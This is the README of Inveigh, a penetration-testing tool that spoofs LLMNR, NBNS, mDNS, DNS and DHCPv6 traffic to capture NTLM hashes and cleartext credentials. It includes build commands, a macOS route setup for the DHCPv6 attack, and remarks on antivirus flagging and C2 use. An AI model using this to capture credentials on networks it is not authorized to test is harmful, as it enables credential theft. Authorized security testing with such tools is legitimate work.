# Inveigh

Inveigh is a cross-platform .NET IPv4/IPv6 machine-in-the-middle tool for penetration testers. This repo contains the primary C# version as well as the legacy PowerShell version.  

## Overview

Inveigh conducts spoofing attacks and hash/credential captures through both packet sniffing and protocol specific isteners/sockets. The packet sniffing method, which was the basis for the original Powershell version of this tool, has the following advantages:

* SMB NTLM challenge/response captures over the Window's SMB service
* Fewer visible port binds on the host system

The primary disadvantage is the required elevated access.

On current versions of Windows, the default running UDP services allow port reuse. Therefore, packet sniffing no longer provides an advantage for getting around in-use UDP ports. Inveigh's UDP listeners are all configured to take advantage of port reuse.

### Version Descriptions
* **PowerShell Inveigh** - original version developed over many years. For now at least, this version (1.506) will go without additional updates. Documentation can be found [here](https://github.com/Kevin-Robertson/Inveigh/wiki).
* **C# Inveigh (aka InveighZero)** - original C# POC code combined with a C# port of most of the Powershell version's code. This version has now been rebuilt for C# and is taking over as the primary version. For now, the InveighZero will continue to be udated with just the latest C# version as a download alternative to avoid AV flagging the Powershell code.

### Features

The C# version of Inveigh contains attacks for the following protocols:

* [LLMNR](#LLMNR) [packet sniffer | listener]
* [DNS](#DNS) [packet sniffer | listener]
* [mDNS](#mDNS) [packet sniffer | listener]
* [NBNS](#NBNS) [packet sniffer | listener]
* [DHCPv6](#DHCPv6) [packet sniffer | listener]
* [ICMPv6](#ICMPv6) [privileged raw socket]
* [HTTP](#HTTP) [listener]
* [HTTPS](#HTTPS) [listener]
* [SMB](#SMB) [packet sniffer | listener]
* [LDAP](#LDAP) [listener]
* [WebDAV](#WebDAV) [listener]
* [Proxy Auth](#Proxy) [listener]
 
Inveigh works with both IPv4 and IPv6 in cases where support for both is provided by the underlying protocol.

## Cross-Platform Support

Inveigh's SDK style project file is setup for .NET 3.5, 4.5, and 5.0 with 5.0 being the version that also works with Linux and macOS.  

`<TargetFrameworks>net35;net45;net5.0</TargetFrameworks>`

Windows is still the primary usage target, however I will attempt to support all platforms for new features going forward. For the most part, Inveigh just worked on all 3 platforms once I converted to an SDK project file.

### Known Issues

* The packet sniffer is available only on Windows due to differences in the raw socket setups. When compiled for either Linux or macOS, the packet sniffer will just be disabled. Instead, Inveigh's SMB listener can be used if port 445 is open.
* macOS requires that routes are avalable for joining multicast groups. In my testing, I've had to add routes for DHCPv6 multicast in order to carry out that attack on this platform.  
 `sudo route -nv add -net ff02::1:2 -interface en0`

### Linux/macOS Compiling 

* With .NET 5.0 installed on target system  
`dotnet publish -r linux-x64 -f net5.0 -p:AssemblyName=inveigh`  
`dotnet publish -r osx-x64 -f net5.0 -p:AssemblyName=inveigh`  

* Without .NET 5.0 installed on target system  
`dotnet publish --self-contained=true -p:PublishSingleFile=true -r linux-x64 -f net5.0 -p:AssemblyName=inveigh`  
`dotnet publish --self-contained=true -p:PublishSingleFile=true -r osx-x64 -f net5.0 -p:AssemblyName=inveigh`  

## Usage

Default parameter values are located at the beginning of Program.cs. I recommend reviewing and setting everything to fit your needs before compile. All enable/disable parameters can be set with `Y/N` values.

```
    //begin parameters - set defaults as needed before compile
    public static string argCert = "MIIKaQIBAzCCC..."
    public static string argCertPassword = "password";
    public static string argChallenge = "";
    public static string argConsole = "3";
    public static string argConsoleLimit = "-1";
    public static string argConsoleStatus = "0";
    public static string argConsoleUnique = "Y";
    public static string argDHCPv6 = "N";
    public static string argDHCPv6TTL = "30";
    public static string argDNS = "Y";
    ...
    //end parameters
```

## Console

Inveigh contains a console that is accessible while the tool is running (hit escape to enter and exit). The console provides easy access to captured credentials/hashes and other various information. The console's prompt provides real-time updates for cleartext, NTLMv1, and NTLMv2 captue counts in the format of unique:total. Note, the console may be inaccessible when running through C2.
